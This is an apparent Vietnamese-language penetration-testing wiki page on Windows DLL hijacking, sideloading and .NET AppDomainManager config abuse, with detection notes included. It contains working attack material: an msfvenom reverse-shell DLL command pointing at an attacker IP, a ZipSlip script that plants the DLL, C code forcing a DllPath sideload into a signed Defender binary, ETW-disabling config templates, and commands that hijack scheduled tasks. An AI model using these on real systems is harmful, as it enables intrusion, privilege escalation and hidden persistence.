# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Thông tin cơ bản

DLL Hijacking là việc thao túng một ứng dụng đáng tin cậy để ứng dụng tải một DLL độc hại. Thuật ngữ này bao gồm một số chiến thuật như **DLL Spoofing, Injection và Side-Loading**. Kỹ thuật này chủ yếu được sử dụng để thực thi mã, duy trì persistence và ít phổ biến hơn là leo thang đặc quyền. Dù nội dung ở đây tập trung vào leo thang đặc quyền, phương pháp hijacking vẫn nhất quán giữa các mục tiêu.

### Kỹ thuật phổ biến

Có một số phương pháp DLL hijacking, mỗi phương pháp có hiệu quả khác nhau tùy thuộc vào chiến lược tải DLL của ứng dụng:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Thay DLL hợp lệ bằng DLL độc hại, có thể dùng DLL Proxying để giữ nguyên chức năng của DLL gốc.
2. **DLL Search Order Hijacking**: Đặt DLL độc hại trong đường dẫn tìm kiếm đứng trước DLL hợp lệ, khai thác thứ tự tìm kiếm của ứng dụng.
3. **Phantom DLL Hijacking**: Tạo DLL độc hại để ứng dụng tải, trong khi ứng dụng cho rằng đó là một DLL cần thiết nhưng không tồn tại.
4. **DLL Redirection**: Sửa đổi các tham số tìm kiếm như `%PATH%` hoặc các tệp `.exe.manifest` / `.exe.local` để hướng ứng dụng đến DLL độc hại.
5. **WinSxS DLL Replacement**: Thay DLL hợp lệ bằng DLL độc hại tương ứng trong thư mục WinSxS; phương pháp này thường liên quan đến DLL side-loading.
6. **Relative Path DLL Hijacking**: Đặt DLL độc hại trong thư mục do người dùng kiểm soát cùng với ứng dụng được sao chép, tương tự các kỹ thuật Binary Proxy Execution.

Ứng dụng cũng có thể triển khai **trình tải DLL riêng**. Một tiến trình có đặc quyền có thể liệt kê thư mục con như `Libraries` hoặc `Plugins` rồi chuyển một DLL được chọn cho chương trình trợ giúp, độc lập với thứ tự tìm kiếm DLL thông thường của Windows. Nếu tài khoản khác có thể tạo tệp trong đúng thư mục đó, hãy xem đây là đầu mối cần kiểm tra: xác nhận danh tính tiến trình, ACL hiệu lực của thư mục, quy tắc chọn tệp và thao tác tải có thể được kích hoạt. Thư mục có thể ghi nằm cạnh tệp thực thi không chứng minh rằng tiến trình tải DLL từ thư mục đó.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}

### Post-installation PE import grafting

Side-loading kiểu cổ điển giữ nguyên PE đáng tin cậy và chiếm quyền phân giải tên DLL. Ngược lại, **Import grafting** sửa đổi một PE đã được chương trình đáng tin cậy tải. Kẻ tấn công thêm một import descriptor cùng các mục lookup/IAT tương ứng cho một DLL do kẻ tấn công kiểm soát. Khi Windows đệ quy phân giải dependency đó, hệ thống ánh xạ DLL vừa thêm và chạy mã khởi tạo của nó bên trong tiến trình vốn hợp pháp. Đây là sửa đổi PE trên đĩa, không phải thao tác thay một con trỏ hàm IAT đang hoạt động bằng hook lúc runtime.<sup>[[31]](#references)[[32]](#references)</sup>

PE bị sửa đổi có thể là một DLL trung gian của nhà cung cấp, chứ không nhất thiết là tệp thực thi do người dùng hoặc Task Scheduler khởi chạy. Một chuỗi có thể tái sử dụng như sau:<sup>[[32]](#references)</sup>

1. Sao chép tệp thực thi hợp lệ và các dependency của nó vào thư mục do kẻ tấn công kiểm soát.
2. Chỉnh sửa cấu trúc import của một dependency để tham chiếu đến DLL độc hại, đồng thời giữ lại các export mà dependency cần và hành vi bình thường.
3. Cấu hình autorun hoặc scheduled task để khởi chạy tệp thực thi hợp lệ. Loader ánh xạ dependency đã chỉnh sửa rồi đến DLL vừa được import. Xem [Privilege Escalation with Autoruns](../privilege-escalation-with-autorun-binaries.md#scheduled-tasks) để liệt kê task.
4. Không thực hiện các tác vụ tốn nhiều tài nguyên trong `DllMain`; loader được quan sát đã tạo một worker thread và tiếp tục giải mã theo từng giai đoạn ở đó.

Điều này khác với việc xâm phạm chuỗi cung ứng phía nhà cung cấp, vì gói của nhà cung cấp vẫn sạch và việc sửa đổi import diễn ra sau khi cài đặt. Khi phân tích, hãy kiểm tra mọi module trong thư mục staging, không chỉ host EXE: so sánh danh sách import và hash của các dependency với bản cài đặt chuẩn, xác minh chữ ký và điều tra các binary của nhà cung cấp được khởi chạy từ những vị trí có thể ghi bất thường như `C:\ProgramData`. Một scheduled task trỏ đến bản sao crash reporter hoặc updater trong thư mục như vậy là một hướng pivot đặc biệt hữu ích.<sup>[[32]](#references)</sup>


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Classic DLL sideloading không phải là cách duy nhất để khiến một tiến trình **.NET Framework** đáng tin cậy tải mã của kẻ tấn công. Nếu tệp thực thi mục tiêu là một ứng dụng **managed**, CLR cũng kiểm tra **tệp cấu hình ứng dụng** có tên theo tệp thực thi (ví dụ: `Setup.exe.config`). Tệp này có thể định nghĩa một **AppDomainManager** tùy chỉnh. Nếu cấu hình trỏ đến một assembly do kẻ tấn công kiểm soát được đặt cạnh EXE, CLR sẽ tải assembly đó **trước đường dẫn mã thông thường của ứng dụng** và chạy bên trong tiến trình đáng tin cậy.<sup>[[24]](#references)</sup>

Theo schema cấu hình .NET Framework của Microsoft, phải có cả `<appDomainManagerAssembly>` và `<appDomainManagerType>` thì trình quản lý tùy chỉnh mới được sử dụng.<sup>[[16]](#references)[[17]](#references)</sup>

Cấu hình tối thiểu:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Trình quản lý tối giản:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Ghi chú thực tế:
- Đây là kỹ thuật chỉ dành cho **.NET Framework**. Kỹ thuật này dựa vào việc phân tích cấu hình của CLR, không dựa vào thứ tự tìm kiếm DLL của Win32.
- Host phải thực sự là một **managed EXE**. Kiểm tra nhanh: `sigcheck -m target.exe`, `corflags target.exe` hoặc kiểm tra **CLR Runtime Header** trong metadata PE.
- Tên file cấu hình phải khớp chính xác với tên executable (`<binary>.config`) và thường nằm **cạnh EXE**.
- Kỹ thuật này hữu ích với các binary **đã được Microsoft/nhà cung cấp ký**, vì EXE đáng tin cậy vẫn nguyên vẹn trong khi managed assembly độc hại được thực thi trong cùng tiến trình.
- Nếu đã có quyền ghi vào thư mục cài đặt/cập nhật, có thể dùng AppDomainManager hijacking làm **giai đoạn đầu**, sau đó dùng DLL sideloading cổ điển hoặc reflective loading cho các giai đoạn tiếp theo.

### Signed AppDomainManager type làm configuration-file gadget

AppDomainManager config hijack thông thường ở trên trỏ đến một assembly của attacker. Một hướng khác trong .NET Framework sử dụng một **signed assembly**, được đặt cạnh host hoặc có thể được phân giải bằng cách khác, có manager type đọc dữ liệu sidecar do attacker kiểm soát. Attacker vẫn cần kiểm soát file `.exe.config` nằm cạnh managed host và các file thứ cấp; chữ ký của assembly được chọn không khiến đầu vào cấu hình của nó trở nên an toàn. Cơ chế cấu hình này là hành vi AppDomainManager đã được thiết lập, còn kiểu chaining bằng signed type bên dưới được phát hiện trong quá trình phân tích NetamLoader.<sup>[[16]](#references)[[17]](#references)[[35]](#references)</sup>

Trong chuỗi đó, cấu hình chọn `Microsoft.ApplicationServer.Caching.DataCacheFactoryConfiguration` từ `Microsoft.HostIntegration.Connectors`. Quá trình khởi tạo của type này tìm `fabric.config` trong thư mục ứng dụng. Một mục `customType` chỉ định `System.Resources.ResXResourceSet` và cung cấp `Resources.resx` làm đối số cho constructor của nó, từ đó tiếp cận trình phân tích tài nguyên mà không cần phân phối một manager DLL do attacker tạo. Cách này đòi hỏi assembly đã ký liên quan đến AppFabric và các lớp framework được nêu phải phân giải được trên mục tiêu; đây không phải thuộc tính phổ quát của mọi managed EXE.<sup>[[35]](#references)</sup> AppDomainManager được cấu hình cũng yêu cầu ứng dụng full-trust; nếu không, CLR sẽ ném `TypeLoadException`.<sup>[[16]](#references)[[17]](#references)</sup>

```xml
<!-- in <host>.exe.config -->
<configuration>
  <runtime>
    <appDomainManagerType value="Microsoft.ApplicationServer.Caching.DataCacheFactoryConfiguration" />
    <appDomainManagerAssembly value="Microsoft.HostIntegration.Connectors, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" />
  </runtime>
</configuration>
```

```xml
<!-- adjacent fabric.config -->
<section name="foo">
  <customType className="System.Resources.ResXResourceSet, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089(Resources.resx)" />
</section>
```

Nội dung `Resources.resx` là điểm tiếp nhận giải tuần tự hóa, không chỉ đơn thuần là tệp dữ liệu; xem [RESX to BinaryFormatter and XAML](../../../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml). Trong giai đoạn được báo cáo, XAML loader cũng tạo khóa AES từ hash SHA-256 của **toàn bộ dòng lệnh của host sau khi chuyển thành chữ thường**, đồng thời dùng 16 byte đầu tiên của blob đã giải mã làm IV. Vì vậy, phát lại các tệp với dòng lệnh khác sẽ khiến quá trình giải mã thất bại trước khi XAML tiếp theo được tải.<sup>[[35]](#references)</sup>

### AppDomainManager làm downloader + bootstrap cho scheduled task

Một mẫu xâm nhập thực tế là kết hợp EXE .NET đáng tin cậy với cả tệp `*.config` độc hại và DLL AppDomainManager độc hại chỉ đóng vai trò **bootstrapper nhỏ gọn**:<sup>[[25]](#references)</sup>

1. Người dùng khởi chạy installer hoặc updater .NET đã ký từ một vị trí trông có vẻ hợp lý, chẳng hạn `%USERPROFILE%\Downloads`.
2. Tệp config đi kèm khiến CLR tải assembly của attacker **trước khi logic ứng dụng hợp pháp bắt đầu chạy**.
3. Manager độc hại thực hiện **kiểm tra đường dẫn** (ví dụ: chỉ tiếp tục nếu host EXE chạy từ `Downloads`, và chỉ cho phép stage thứ hai chạy từ `%LOCALAPPDATA%`).
4. Nếu kiểm tra thành công, nó tải payload thật xuống một đường dẫn mà người dùng có quyền ghi, chẳng hạn `%LOCALAPPDATA%\PerfWatson2.exe`, rồi thiết lập persistence bằng scheduled task.

Vì sao biến thể này đáng chú ý:
- Host EXE đã ký không bị thay đổi, vì vậy hoạt động triage chỉ hash binary chính có thể bỏ sót việc bị xâm nhập.
- **Anti-analysis dựa trên đường dẫn** đơn giản rất phổ biến: chuyển bộ ba ZIP/EXE/DLL sang Desktop, Temp hoặc đường dẫn sandbox có thể khiến chuỗi này cố ý bị gián đoạn.
- DLL AppDomainManager ở stage đầu có thể giữ kích thước nhỏ và ít gây chú ý, trong khi implant thật được tải xuống sau.

Ví dụ persistence tối giản thường thấy với mẫu này:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Ghi chú:
- `/rl highest` có nghĩa là **mức cao nhất hiện có** cho người dùng/phiên đó; bản thân nó không đảm bảo nâng quyền lên SYSTEM.
- Kỹ thuật này thường được xếp vào nhóm **execution/persistence thông qua lạm dụng cấu hình .NET** hơn là kiểu chiếm quyền tìm kiếm DLL cổ điển do thiếu DLL, dù các operator thường kết hợp cả hai.

Các dấu hiệu cần phát hiện:
- Executable .NET đã ký được khởi chạy từ **đường dẫn giải nén ZIP**, `Downloads`, `%TEMP%` hoặc các thư mục khác mà người dùng có quyền ghi, đồng thời có tệp `<exe>.config` **cùng thư mục**.
- Task Scheduler mới có action trỏ đến `%LOCALAPPDATA%`, `%APPDATA%` hoặc `Downloads`, với tên giả dạng trình cập nhật của trình duyệt/nhà cung cấp.
- Các tiến trình bootstrap managed chạy trong thời gian ngắn, ngay lập tức tải xuống một EXE khác, rồi khởi chạy `schtasks.exe`.
- Các mẫu thoát sớm trừ khi đường dẫn executable khớp với thư mục hồ sơ người dùng dự kiến.

### Chiếm quyền một scheduled task hiện có để chạy lại chuỗi sideload

Để duy trì persistence, đừng chỉ tìm cách **tạo task mới**. Một số nhóm xâm nhập chờ trình cài đặt hợp pháp tạo **task cập nhật thông thường**, sau đó **ghi đè action của task** để tên, tác giả và trigger hiện có vẫn quen thuộc với đội phòng thủ.

Quy trình có thể tái sử dụng:
1. Cài đặt/chạy phần mềm hợp pháp và xác định task mà phần mềm thường tạo.
2. Xuất XML của task và ghi lại các giá trị `<Exec><Command>` / `<Arguments>` hiện tại.<sup>[[23]](#references)</sup>
3. Chỉ thay action để task khởi chạy **host EXE đáng tin cậy** từ thư mục staging mà người dùng có quyền ghi; sau đó EXE này sideload hoặc tải payload thực qua AppDomain.
4. Đăng ký lại cùng tên task thay vì tạo một artifact persistence mới dễ bị phát hiện.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Vì sao cách này kín đáo hơn:
- Tên tác vụ vẫn có thể trông hợp pháp (ví dụ: trình cập nhật của nhà cung cấp).
- **Dịch vụ Task Scheduler** khởi chạy tác vụ, nên việc xác thực tiến trình cha/tổ tiên thường thấy chuỗi lập lịch như dự kiến thay vì `explorer.exe`.
- Các nhóm DFIR chỉ tìm **tên tác vụ mới** có thể bỏ sót tác vụ đã được đăng ký từ trước nhưng giờ có hành động trỏ đến `%LOCALAPPDATA%`, `%APPDATA%` hoặc đường dẫn khác do kẻ tấn công kiểm soát.

Các điểm nhanh để truy tìm:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- So sánh XML trong `C:\Windows\System32\Tasks\*` và metadata trong `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` với dữ liệu chuẩn.
- Tạo cảnh báo khi **tác vụ cập nhật trông như của nhà cung cấp** chạy từ **thư mục mà người dùng có thể ghi** hoặc khởi chạy một .NET EXE cùng với tệp `*.config` đặt cạnh nó.

> [!TIP]
> Để xem chuỗi từng bước kết hợp HTML staging, cấu hình AES-CTR và .NET implant với DLL sideloading, hãy xem quy trình bên dưới.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

### Ràng buộc một stage được side-load với dòng lệnh của service

Một DLL được side-load có thể cần nhiều hơn tên host EXE và DLL như dự kiến. Mandiant mô tả một loader ràng buộc quá trình giải mã payload với một tham số dòng lệnh và tên của tệp thực thi host.<sup>[[33]](#references)</sup> Trong một chuỗi về sau được hỗ trợ bởi service, một host hợp pháp được sao chép đã tải `mscoree.dll` nằm cạnh nó; DLL này export `LockClrVersion` và chỉ giải mã stage được nhúng sau khi tạo khóa AES-128 từ tham số của service và basename của tệp thực thi host. Mỗi đầu vào được cắt ngắn hoặc đệm NUL thành 16 byte; khóa được tạo bằng phép XOR từng byte: `argument XOR embedded_key XOR executable_basename`, sau đó payload được giải mã bằng AES-CBC không đệm. Đổi tên host hoặc chạy nó mà không có tham số dự kiến sẽ làm thay đổi khóa và ngăn stage này được giải mã, ngay cả khi DLL vẫn được tải. Hãy giữ nguyên chính xác tham số dòng lệnh và basename khi tái hiện hoặc phân tích biến thể này.<sup>[[34]](#references)</sup>

Đây là **payload gate được thêm trên cơ chế DLL side-loading thông thường**, không phải quy tắc mới về thứ tự tìm kiếm DLL hay một primitive leo thang đặc quyền độc lập. Ngữ cảnh bảo mật của service quyết định mức đặc quyền thu được. Quy trình [GitHub issue/file C2](../../../generic-methodologies-and-resources/github-issues-and-repository-files-c2.md) ghi lại riêng phương thức truyền tải được sử dụng về sau.<sup>[[34]](#references)</sup>

## Tìm DLL bị thiếu

Cách phổ biến nhất để tìm DLL bị thiếu trong hệ thống là chạy [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) từ sysinternals, **thiết lập** **2 bộ lọc sau**:

![Kỹ thuật phổ biến - Tìm DLL bị thiếu: Cách phổ biến nhất để tìm DLL bị thiếu trong hệ thống là chạy procmon từ sysinternals, thiết lập 2 bộ lọc sau](<../../../images/image (961).png>)

![Kỹ thuật phổ biến - Tìm DLL bị thiếu: Cách phổ biến nhất để tìm DLL bị thiếu trong hệ thống là chạy procmon từ sysinternals, thiết lập 2 bộ lọc sau](<../../../images/image (230).png>)

và chỉ hiển thị **File System Activity**:

![Kỹ thuật phổ biến - Tìm DLL bị thiếu: và chỉ hiển thị File System Activity](<../../../images/image (153).png>)

Nếu bạn đang tìm **các DLL bị thiếu nói chung**, hãy để chương trình chạy trong vài **giây**.\
Nếu bạn đang tìm **DLL bị thiếu trong một tệp thực thi cụ thể**, hãy đặt thêm bộ lọc như **"Process Name" "contains" `<exec name>`**, chạy tệp đó rồi dừng ghi lại sự kiện.<sup>[[9]](#references)</sup>

## Khai thác DLL bị thiếu

Để leo thang đặc quyền, hãy tìm **DLL mà một tiến trình có đặc quyền cố tải** từ vị trí bạn có thể ghi vào. Trường hợp này có thể xảy ra khi bạn kiểm soát một thư mục được tìm kiếm trước thư mục chứa DLL hợp pháp, hoặc khi DLL được yêu cầu không tồn tại và bạn có thể ghi vào một trong các thư mục được tìm kiếm.

### Thứ tự tìm kiếm DLL

**Bạn có thể xem cách tải DLL cụ thể trong** [**tài liệu của Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching)**.**

**Các ứng dụng Windows** tìm DLL theo một tập hợp **đường dẫn tìm kiếm được xác định trước**, theo một trình tự cụ thể. DLL hijacking xảy ra khi một DLL độc hại được đặt có chủ đích vào một trong các thư mục này để nó được tải trước DLL chính thống. Có thể ngăn chặn việc này bằng cách bảo đảm ứng dụng dùng đường dẫn tuyệt đối khi tham chiếu đến các DLL cần thiết.

Dưới đây là **thứ tự tìm kiếm DLL trên hệ thống 32-bit**:

1. Thư mục nơi ứng dụng được tải.
2. Thư mục hệ thống. Dùng hàm [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) để lấy đường dẫn của thư mục này.(_C:\Windows\System32_)
3. Thư mục hệ thống 16-bit. Không có hàm nào lấy được đường dẫn của thư mục này, nhưng hệ thống vẫn tìm kiếm trong đó. (_C:\Windows\System_)
4. Thư mục Windows. Dùng hàm [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) để lấy đường dẫn của thư mục này.
   1. (_C:\Windows_)
5. Thư mục hiện tại.
6. Các thư mục được liệt kê trong biến môi trường PATH. Lưu ý rằng danh sách này không bao gồm đường dẫn theo từng ứng dụng được chỉ định trong khóa registry **App Paths**. Khóa **App Paths** không được dùng khi tính đường dẫn tìm kiếm DLL.

Đây là thứ tự tìm kiếm **mặc định** khi bật **SafeDllSearchMode**. Khi tắt tính năng này, thư mục hiện tại được nâng lên vị trí thứ hai. Để tắt tính năng, hãy tạo giá trị registry **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** và đặt giá trị thành 0 (mặc định là bật).

Nếu hàm [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) được gọi với **LOAD_WITH_ALTERED_SEARCH_PATH**, quá trình tìm kiếm bắt đầu trong thư mục của module thực thi mà **LoadLibraryEx** đang tải.

Cuối cùng, DLL có thể được tải bằng đường dẫn tuyệt đối thay vì tên. Trong trường hợp đó, Windows chỉ tìm chính DLL tại đường dẫn đó; các dependency được yêu cầu theo tên vẫn tuân theo thứ tự tìm kiếm áp dụng.

Có những cách khác để thay đổi thứ tự tìm kiếm, nhưng tôi sẽ không giải thích ở đây.

### Kết hợp arbitrary file write với khai thác DLL bị thiếu

**Kỹ thuật liên quan:** [chuyển mount point có kiểm soát bằng oplock để chống lại remediation có đặc quyền](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Dùng bộ lọc **ProcMon** (`Process Name` = tệp EXE mục tiêu, `Path` kết thúc bằng `.dll`, `Result` = `NAME NOT FOUND`) để thu thập tên DLL mà tiến trình tìm nhưng không thấy.<sup>[[14]](#references)</sup>
2. Nếu binary chạy theo **lịch hoặc dưới dạng service**, việc đặt một DLL có một trong các tên đó vào **thư mục ứng dụng** (vị trí số 1 trong thứ tự tìm kiếm) sẽ khiến DLL được tải trong lần chạy tiếp theo. Trong một trường hợp với trình quét .NET, tiến trình tìm `hostfxr.dll` trong `C:\samples\app\` trước khi tải bản thật từ `C:\Program Files\dotnet\fxr\...`.
3. Tạo payload DLL (ví dụ: reverse shell) với bất kỳ export nào: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Nếu primitive của bạn là **arbitrary write kiểu ZipSlip**, hãy tạo một ZIP có entry thoát khỏi thư mục giải nén để DLL được ghi vào thư mục ứng dụng:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Đưa archive vào inbox/share được theo dõi; khi scheduled task khởi chạy lại process, process sẽ tải malicious DLL và thực thi code của bạn dưới quyền service account.

### Ép sideloading thông qua RTL_USER_PROCESS_PARAMETERS.DllPath

Một cách nâng cao để tác động một cách xác định đến DLL search path của process mới được tạo là đặt trường DllPath trong RTL_USER_PROCESS_PARAMETERS khi tạo process bằng các native API của ntdll. Bằng cách cung cấp một thư mục do attacker kiểm soát ở đây, có thể buộc một target process phân giải DLL được import theo tên (không dùng absolute path và không dùng safe loading flags) tải malicious DLL từ thư mục đó.

Ý tưởng chính
- Tạo process parameters bằng RtlCreateProcessParametersEx và cung cấp DllPath tùy chỉnh trỏ đến thư mục bạn kiểm soát (ví dụ: thư mục chứa dropper/unpacker của bạn).
- Tạo process bằng RtlCreateUserProcess. Khi target binary phân giải DLL theo tên, loader sẽ tham khảo DllPath được cung cấp trong quá trình phân giải, cho phép sideloading đáng tin cậy ngay cả khi malicious DLL không nằm cùng thư mục với target EXE.

Ghi chú/giới hạn
- Cách này ảnh hưởng đến child process đang được tạo; khác với SetDllDirectory, vốn chỉ ảnh hưởng đến process hiện tại.
- Target phải import hoặc LoadLibrary một DLL theo tên (không dùng absolute path và không dùng LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- Không thể hijack KnownDLLs và các absolute path được hardcode. Forwarded exports và SxS có thể làm thay đổi thứ tự ưu tiên.

Ví dụ C tối giản (ntdll, wide strings, xử lý lỗi đơn giản):

<details>
<summary>Ví dụ C đầy đủ: ép DLL sideloading thông qua RTL_USER_PROCESS_PARAMETERS.DllPath</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Ví dụ sử dụng trong thực tế
- Đặt một xmllite.dll độc hại (xuất các hàm cần thiết hoặc proxy tới DLL thật) trong thư mục DllPath.
- Khởi chạy một binary đã ký được biết là tra cứu xmllite.dll theo tên bằng kỹ thuật trên. Loader phân giải import thông qua DllPath được chỉ định và sideload DLL của bạn.

Kỹ thuật này đã được ghi nhận ngoài thực tế trong các chuỗi sideloading nhiều giai đoạn: launcher ban đầu thả một DLL trợ giúp, sau đó DLL này khởi chạy một binary có chữ ký của Microsoft có thể bị hijack, cùng DllPath tùy chỉnh để buộc nạp DLL của attacker từ thư mục staging.<sup>[[6]](#references)</sup>


### Hijacking .NET AppDomainManager qua `.exe.config`

Đối với các mục tiêu **.NET Framework**, có thể sideload **trước `Main()`** mà không cần vá bộ nhớ bằng cách lợi dụng tệp **`.exe.config`** nằm cạnh ứng dụng. Thay vì chỉ dựa vào thứ tự tìm kiếm DLL của Win32, attacker đặt một EXE .NET hợp lệ cạnh một tệp config độc hại và một hoặc nhiều assembly do attacker kiểm soát.

Cách chuỗi này hoạt động:<sup>[[15]](#references)[[22]](#references)</sup>
1. EXE host khởi chạy và **CLR đọc `<exe>.config`**.
2. Tệp config thiết lập **`<appDomainManagerAssembly>`** và **`<appDomainManagerType>`** để runtime khởi tạo một `AppDomainManager` do attacker kiểm soát.
3. Manager độc hại thực thi **trước `Main()`** bên trong tiến trình host đáng tin cậy.
4. Cùng tệp config có thể buộc CLR ưu tiên phân giải các assembly cục bộ (ví dụ `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) và làm suy yếu việc xác thực/đo từ xa của runtime mà không cần vá inline.

Mẫu kiểu chiến dịch (cấu trúc lồng chính xác có thể thay đổi tùy chỉ thị / phiên bản CLR):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Vì sao điều này hữu ích:
- **`<probing privatePath="."/>`** giữ quá trình phân giải assembly trong thư mục ứng dụng, biến thư mục này thành một bề mặt sideloading có thể dự đoán.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** chuyển quá trình thực thi sang mã của attacker trong lúc khởi tạo CLR, trước khi logic ứng dụng hợp lệ chạy.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** có thể cho phép ứng dụng full-trust tải assembly chưa ký hoặc bị sửa đổi mà không gặp lỗi xác thực strong-name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** tránh các chuyển hướng của publisher policy sang assembly mới hơn.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** giúp việc chọn runtime có tính xác định cao hơn.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** đặc biệt đáng chú ý vì **CLR vô hiệu hóa khả năng quan sát ETW của chính nó** từ cấu hình, thay vì implant vá `EtwEventWrite` trong bộ nhớ.

Mô hình hoạt động được ghi nhận trong các chiến dịch gần đây:
- Giai đoạn 1 thả `setup.exe`, `setup.exe.config` và các assembly cục bộ.
- Giai đoạn 2 sao chép chúng vào thư mục **AppData update** trông có vẻ hợp lệ, đổi tên host thành tên như `update.exe`, rồi khởi chạy lại bằng **scheduled task**.
- Giai đoạn 3 xác minh ngữ cảnh thực thi (ví dụ tiến trình cha mong đợi là `svchost.exe` do Task Scheduler tạo) trước khi tải DLL/export RAT cuối cùng.

